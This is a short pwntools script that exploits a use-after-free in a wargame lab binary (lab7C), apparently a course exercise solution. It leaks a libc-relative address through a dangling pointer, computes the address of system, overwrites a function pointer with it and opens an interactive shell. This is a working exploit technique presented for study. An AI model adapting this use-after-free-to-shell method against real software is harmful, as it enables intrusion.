from pwn import *

r = process("/levels/lab07/lab7C")

# allocating number
r.sendline("2")
r.sendline(str(0x31337 + 1))
# deleting number
r.sendline("4")
# allocating string on top
r.sendline("1")
r.sendline("/bin/sh\x00")
# using the dangling pointer to read address
r.sendline("6")
r.sendline("1")
# reading the leaked address
r.recvuntil("tite number dawg: ")
leak = int(r.recvline())

system = leak - 0x19da37
# deleting string
r.sendline("3")
# allocating number on top
r.sendline("2")
# replacing the function with system
r.sendline(str(system))
r.sendline("5")
r.sendline("1")
r.interactive()
